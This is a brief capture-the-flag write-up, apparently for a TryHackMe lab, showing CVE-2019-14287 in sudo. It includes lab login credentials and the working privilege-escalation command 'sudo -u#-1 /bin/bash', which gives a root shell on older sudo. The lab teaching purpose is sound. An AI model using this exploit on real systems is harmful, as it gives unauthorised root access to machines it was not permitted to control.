---
description: A tutorial room exploring CVE-2019-14287 in the Unix Sudo Program
---

# Sudo Security Bypass

This exploit has since been fixed, but may still be present in older versions of Sudo (**versions < 1.8.28**), so it's well worth keeping an eye out for! This will _only_ work if you've been granted non-root sudo permissions for the command

## Task 2 Security Bypass

#### **What command are you allowed to run with sudo?**

```
sshpass -p tryhackme ssh -p 2222 tryhackme@10.10.28.74
sudo -l
```

![](<../../.gitbook/assets/Screenshot from 2020-08-24 09-03-23.png>)

#### **What is the flag in /root/root.txt?**

```
sudo -u#-1 /bin/bash
```

![](<../../.gitbook/assets/Screenshot from 2020-08-24 09-17-21.png>)
